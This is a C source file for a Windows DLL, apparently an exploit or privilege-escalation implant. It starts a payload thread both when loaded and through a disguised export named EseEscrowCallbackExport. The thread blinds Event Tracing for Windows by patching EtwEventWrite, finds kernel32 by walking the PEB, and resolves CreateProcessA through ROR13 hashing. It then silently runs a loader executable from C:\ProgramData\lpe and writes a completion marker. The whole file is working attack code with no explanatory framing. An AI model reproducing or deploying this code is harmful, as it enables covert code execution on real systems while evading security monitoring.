#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static DWORD ror13(const char* name) {
    DWORD h = 0;
    for (const char* p = name; *p; p++) {
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF;
        h = (h + (BYTE)*p) & 0xFFFFFFFF;
    }
    return h;
}

static PVOID find_export(BYTE* base, DWORD hash) {
    DWORD pe    = *(DWORD*)(base + 0x3C);
    DWORD exp   = *(DWORD*)(base + pe + 0x88);
    BYTE* ed    = base + exp;
    DWORD num   = *(DWORD*)(ed + 0x18);
    DWORD* names = (DWORD*)(base + *(DWORD*)(ed + 0x20));
    WORD*  ords  = (WORD*) (base + *(DWORD*)(ed + 0x24));
    DWORD* funcs = (DWORD*)(base + *(DWORD*)(ed + 0x1C));
    for (DWORD i = 0; i < num; i++) {
        if (ror13((char*)(base + names[i])) == hash)
            return base + funcs[ords[i]];
    }
    return NULL;
}

typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE,DWORD);

static DWORD WINAPI payload_thread(LPVOID param) {
    Sleep(3000 + (GetTickCount() % 2000));

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old = 0;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3;
    VirtualProtect(etw, 1, old, &old);

    BYTE* peb  = (BYTE*)__readgsqword(0x60);
    BYTE* ldr  = *(BYTE**)(peb  + 0x18);
    BYTE* list = *(BYTE**)(ldr  + 0x20);
    BYTE* e1   = *(BYTE**)list;
    BYTE* e2   = *(BYTE**)e1;
    BYTE* k32  = *(BYTE**)(e2 + 0x20);

    pCreateProcessA      _CPA  = (pCreateProcessA)     find_export(k32, 0x16B3FE72);
    pWaitForSingleObject _WFSO = (pWaitForSingleObject)find_export(k32, 0xCE05D9AD);

    char loader[] = {
        'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
        '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r','.','e','x','e',0
    };

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = 0;

    if (_CPA(loader, NULL, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        _WFSO(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    HANDLE f = CreateFileA("C:\\ProgramData\\lpe\\sg_done.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(f, "OK\n", 3, &w, NULL); CloseHandle(f);
    }
    return 0;
}

__declspec(dllexport) long __stdcall EseEscrowCallbackExport(
    void* s, unsigned int d, unsigned int t, unsigned int c,
    void* pv, unsigned long cb, void* pvCtx, unsigned long cbCtx,
    void* pvCol, unsigned long cbCol, unsigned int grbit)
{
    CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}
